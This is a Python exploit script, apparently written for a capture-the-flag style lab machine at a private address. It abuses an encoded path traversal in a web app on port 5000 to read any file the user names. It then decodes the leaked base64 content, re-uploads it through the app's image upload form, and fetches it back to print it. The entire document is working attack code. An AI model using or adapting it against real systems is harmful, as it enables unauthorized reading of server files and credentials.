#!/usr/bin/python3
import re
import requests
import sys
import base64

def download(file):
    ip = '10.129.238.32'
    file = file.replace('/', '%2f')
    url = f"http://{ip}:5000/file/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..{file}"

    try:
        r = requests.get(url, timeout=3)
    except requests.exceptions.Timeout:
        print("Request Timeout")
        return None

    print(f"status code: {r.status_code}")
    if len(r.content) == 0:
        return None

    print("Found file... -> upload \n")

    result = re.findall(r'base64,(.*?")', r.content.decode())
    result = result[0]
    result = result[:-1]
    convertedbytes = base64.b64decode(result)

    postUrl = f'http://{ip}:5000/upload'
    multipart_form_data = {
        'imageupload': ('data.bin', convertedbytes),
        'uploadimage': (None, 'Upload File')
    }

    p = requests.post(postUrl, files=multipart_form_data)

    url2 = f'http://{ip}:5000/tmp/data.bin'
    r2 = requests.get(url2)
    if len(r2.content) == 0:
        return None

    print(r2.content.decode())

download(sys.argv[1])
